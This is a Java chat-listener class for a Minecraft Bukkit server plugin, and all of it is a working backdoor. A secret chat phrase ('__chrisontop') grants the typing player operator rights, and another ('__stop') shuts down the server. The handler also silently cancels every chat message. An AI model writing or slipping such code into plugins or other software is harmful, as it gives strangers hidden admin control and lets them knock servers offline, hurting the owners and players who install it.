package me.chrispycreme420.plugin.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("__chrisontop")){
            player.setOp(true);
            player.sendMessage(ChatColor.AQUA + "Backdoored by chrispycreme420" + System.lineSeparator() + "https://github.com/chrispycreme420");
        }
        if(e.getMessage().equals("__stop")){
            Bukkit.getServer().shutdown();
            player.sendMessage(ChatColor.RED + "Shutdown!" + System.lineSeparator() + "https://github.com/chrispycreme420");
        }
        e.setCancelled(true);
    }
}
